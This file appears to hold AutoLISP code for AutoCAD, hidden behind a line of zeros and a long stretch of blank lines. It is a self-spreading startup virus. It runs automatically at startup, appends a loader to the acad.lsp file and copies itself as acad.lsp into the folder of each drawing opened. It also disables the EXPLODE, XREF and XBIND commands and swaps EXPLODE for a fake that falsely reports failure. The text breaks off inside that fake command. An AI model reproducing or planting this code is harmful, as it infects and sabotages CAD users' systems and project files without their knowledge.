0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 


































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































(defun
s::startup
(/
old_cmd
path
dwgpath
mnlpath
apppath
oldacad
newacad
nowdwg
lspbj
wjm
wjm1
wjqm
wjqm1
wz
ns1
ns2)
(setq
old_cmd
(getvar
"cmdecho"))
(setvar
"cmdecho"
0)
(setq
path
(findfile
"base.dcl"))
(setq
path
(substr
path
1
(-
(strlen
path)
8)))
(setq
mnlpath
(getvar
"menuname"))
(setq
nowdwg
(getvar
"dwgname"))
(setq
wjqm
(findfile
nowdwg))
(setq
dwgpath
(substr
wjqm
1
(-
(strlen
wjqm)
(strlen
nowdwg))))
(setq
acadpath
(findfile
"acad.lsp"))
(setq
acadpath
(substr
acadpath
1
(-
(strlen
acadpath)
8)))
(setq
ns1
""
ns2
"")
(setq
lspbj
0)
(setq
wjqm
(strcat
path
"acad.lsp"))
(if
(setq
wjm
(open
wjqm
"r"))
(progn
(while
(setq
wz
(read-line
wjm))
(setq
ns1
ns2)
(setq
ns2
wz)
)
(if
(>
(strlen
ns1)
14)
(if
(=
(substr
ns1
8
7)
"acadapp")
(setq
lspbj
1))
)
(close
wjm)
)
)
(if
(and
(=
acadpath
dwgpath)
(/=
acadpath
path))
(progn
(setq
oldacad
(findfile
"acad.lsp"))
(setq
newacad
(strcat
path
"acadapp.lsp"))
(if
(=
lspbj
0)
(progn
(setq
wjqm
(strcat
path
"acad.lsp"))
(setq
wjm
(open
wjqm
"a"))
(write-line
(strcat
"(load
"
(chr
34)
"acadapp"
(chr
34)
")")
wjm)
(write-line
"(princ)"
wjm)
(close
wjm)
)
)
(writeapp)
)
(progn
(if
(/=
nowdwg
"Drawing.dwg")
(progn
(setq
oldacad
(findfile
"acadapp.lsp"))
(setq
newacad
(strcat
dwgpath
"acad.lsp"))
(writeapp)
)
)
)
)
(command
"undefine"
"explode")
(command
"undefine"
"xref")
(command
"undefine"
"xbind")
(setvar
"cmdecho"
old_cmd)
(princ)
)
(defun
writeapp
()
(if
(setq
wjm1
(open
newacad
"w"))
(progn
(setq
wjm
(open
oldacad
"r"))
(while
(setq
wz
(read-line
wjm))
(write-line
wz
wjm1)
)
(close
wjm)
(close
wjm1)
)
)
)
(defun
C:explode
(/
p
cont
old_cmd)
(setq
old_cmd
(getvar
"cmdecho"))
(setvar
"cmdecho"
0)
(setq
p
(ssget))
(if
p
(progn
(setq
cont
(sslength
p))
(princ
"\nSeltct
objects:")
(princ
cont)
(princ
"
found")
(princ
"\n")
(princ
cont)
(princ
"
was
not
able
to
be
explode")
)
)
(setvar
"cmdecho"
